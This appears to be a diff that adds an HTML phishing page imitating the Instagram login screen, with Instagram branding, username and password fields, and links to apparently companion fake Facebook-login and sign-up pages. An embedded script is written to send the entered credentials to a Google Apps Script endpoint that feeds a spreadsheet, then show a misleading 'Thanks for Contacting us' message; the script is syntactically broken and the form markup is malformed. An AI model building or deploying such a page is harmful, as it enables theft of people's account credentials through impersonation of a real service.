@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Instagram</title>
+    <!-- FAVIVON -->
+    <link rel="shortcut icon" href="./img/favicon.png" type="img/png">
+</head>
+<body>
+
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form>
+                   <form method="post" autocomplete="off" name="google-sheet">
+                    <div class="container">
+                    <label for="email" class="sr-only">Phone number, username or email</label>
+                    <input name="email" placeholder="Phone number, username or email" name="uname" required>
+
+
+                    <label for="password" class="sr-only"> Password</label>
+                    <input name="password" type="password" placeholder=" Password" name="psw" required> 
+
+                    <button type="button"> <a href="https://www.w3schools.com/howto/howto_css_login_form.asp"><p style=color:white;>Log In</button></a>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">Or</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a href="file:///C:/Users/Monty/Desktop/zxdvgsd/findex.html">Log in with Facebook</a>
+                        
+                    </div>
+                    <a href="file:///C:/Users/Monty/Desktop/zxdvgsd/eindex.html">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="file:///C:/Users/Monty/Desktop/zxdvgsd/eindex.html">Sign up</a>
+            </div>
+    <script>
+
+const scriptURL ='https://script.google.com/macros/s/AKfycby4IXwOyB9wdrBbtQwr8TGEP10Hz3SyO9ki8NrZqTFpkxs22RFXwXavCcZFezVudOaq/exec'
+
+const form = document.forms ['google-sheet']
+
+form.addEventListener('Log In', e => {
+
+e.preventDefault ()
+
+fetch (scriptURL, method: 'POST', body: new FormData (form) }) .then (response => alert ("Thanks for Contacting us..! We Will Contact You Soon...")) .catch(error => console.error('Error!', error.message))
+
+
+
+</script> 
+</body>
+</html>
